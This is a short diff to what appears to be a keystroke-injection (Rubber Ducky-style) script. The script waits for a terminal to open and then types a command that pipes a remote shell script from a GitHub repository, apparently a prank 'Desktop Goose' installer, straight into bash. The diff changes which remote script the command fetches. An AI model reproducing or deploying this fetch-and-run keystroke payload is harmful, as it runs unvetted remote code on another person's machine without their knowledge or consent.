@@ -28,6 +28,6 @@ REM Wait for Terminal to fully open
 DELAY 1500
 
 REM Execute payload with improved reliability
-STRING curl -sSL https://raw.githubusercontent.com/GatlenCulp/Desktop-Goose-Payload/main/desktop_goose_payload/install.sh | bash
+STRING curl -sSL https://raw.githubusercontent.com/GatlenCulp/Desktop-Goose-Payload/main/payload.sh | bash
 DELAY 1000
 ENTER
